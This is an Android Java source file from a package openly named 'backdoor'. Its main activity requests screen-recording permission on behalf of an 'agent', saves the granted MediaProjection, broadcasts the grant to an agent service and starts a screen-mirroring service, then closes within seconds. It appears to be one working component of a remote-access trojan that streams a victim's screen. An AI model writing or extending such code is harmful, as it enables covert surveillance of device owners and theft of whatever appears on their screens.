package com.lazyframework.backdoor;

import static android.app.Activity.RESULT_OK;

import android.app.Activity;
import android.content.Intent;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;
import android.view.WindowManager;
import android.widget.Toast;

import androidx.appcompat.app.AppCompatActivity;

public class MainActivity extends AppCompatActivity {
private static MediaProjection sMediaProjection = null;
    private static final String TAG = "MainActivity";
    private static final int SCREEN_RECORD_REQUEST_CODE = 9999;
    private static final int SCREENSHOT_REQUEST_CODE = 8888;
private static int sScreenRecordResultCode = 0;
private static Intent sScreenRecordData = null;
    private MediaProjectionManager mediaProjectionManager;
    private Handler mainHandler;
    private String agentId;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        mainHandler = new Handler(Looper.getMainLooper());
        mediaProjectionManager = (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);

        // Buat activity tetap terlihat sebentar
        getWindow().addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON);
        getWindow().addFlags(WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON);

        Log.d(TAG, "✅ MainActivity onCreate");

        Intent intent = getIntent();
        agentId = intent.getStringExtra("agent_id");
        if (agentId == null) {
            agentId = android.provider.Settings.Secure.getString(
                    getContentResolver(), android.provider.Settings.Secure.ANDROID_ID);
        }

        String action = intent.getStringExtra("action");

        if ("request_mirror_permission".equals(action)) {
            Log.d(TAG, "🎥 Requesting screen recording permission...");
            
            // Delay lebih lama agar activity siap
            mainHandler.postDelayed(this::requestScreenRecordingPermission, 800);
        } else {
            Log.w(TAG, "No action, finishing activity");
            finish();
        }
    }

    private void requestScreenRecordingPermission() {
        try {
            if (mediaProjectionManager == null) {
                Log.e(TAG, "❌ MediaProjectionManager null");
                finish();
                return;
            }

            Intent captureIntent = mediaProjectionManager.createScreenCaptureIntent();

            Log.d(TAG, "📋 Launching permission dialog...");
            Toast.makeText(this, "📸 Izinkan rekaman layar untuk LazyFramework", Toast.LENGTH_LONG).show();

            startActivityForResult(captureIntent, SCREEN_RECORD_REQUEST_CODE);

        } catch (Exception e) {
            Log.e(TAG, "❌ Failed to start permission intent", e);
            Toast.makeText(this, "Gagal membuka izin rekaman layar", Toast.LENGTH_LONG).show();
            finish();
        }
    }
    
    private void requestScreenshotPermission() {
    try {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            MediaProjectionManager projectionManager = 
                (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);
            
            if (projectionManager != null) {
                Intent intent = projectionManager.createScreenCaptureIntent();
                startActivityForResult(intent, SCREENSHOT_REQUEST_CODE);
            }
        }
    } catch (Exception e) {
        Log.e(TAG, "Request screenshot permission error: " + e.getMessage());
    }
}

    @Override
protected void onActivityResult(int requestCode, int resultCode, Intent data) {
    super.onActivityResult(requestCode, resultCode, data);

    if (requestCode == SCREEN_RECORD_REQUEST_CODE || requestCode == SCREENSHOT_REQUEST_CODE) {
        if (resultCode == RESULT_OK && data != null) {
            Log.d(TAG, "✅ Screen permission granted!");
            
            // ✅ SIMPAN MediaProjection
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                MediaProjectionManager pm = (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);
                if (pm != null) {
                    MediaProjection projection = pm.getMediaProjection(resultCode, data);
                    ServiceController.setMediaProjection(projection);
                    sMediaProjection = projection;
                    sScreenRecordResultCode = resultCode;
                    sScreenRecordData = data;
                    Log.d(TAG, "✅ MediaProjection saved in ServiceController");
                }
            }

            // ✅ KIRIM BROADCAST KE AgentService
            Intent broadcast = new Intent("com.lazyframework.PERMISSION_GRANTED");
            broadcast.putExtra("type", "screen_capture");
            broadcast.putExtra("result_code", resultCode);
            if (data != null) {
                broadcast.putExtra("data", data);
            }
            sendBroadcast(broadcast);
            Log.d(TAG, "📡 Permission broadcast sent");

            // ✅ LANGSUNG START SCREEN MIRROR
            if ("request_mirror_permission".equals(getIntent().getStringExtra("action"))) {
                startScreenMirrorService(resultCode, data);
            }
            
            // ✅ TUTUP ACTIVITY SETELAH 2 DETIK
            mainHandler.postDelayed(this::finish, 2000);
            
        } else {
            Log.e(TAG, "❌ Screen permission denied!");
            Toast.makeText(this, "❌ Permission denied for screen capture", Toast.LENGTH_LONG).show();
            finish();
        }
    }
}

    private void startScreenMirrorService(int resultCode, Intent data) {
        Intent serviceIntent = new Intent(this, ScreenMirrorService.class);
        serviceIntent.putExtra("action", "START_MIRROR");
        serviceIntent.putExtra("media_projection_result", resultCode);
        serviceIntent.putExtra("media_projection_data", data);
        serviceIntent.putExtra("agent_id", agentId);

        Log.d(TAG, "🚀 Starting ScreenMirrorService...");

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(serviceIntent);
        } else {
            startService(serviceIntent);
        }
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        Log.d(TAG, "MainActivity destroyed");
    }
}
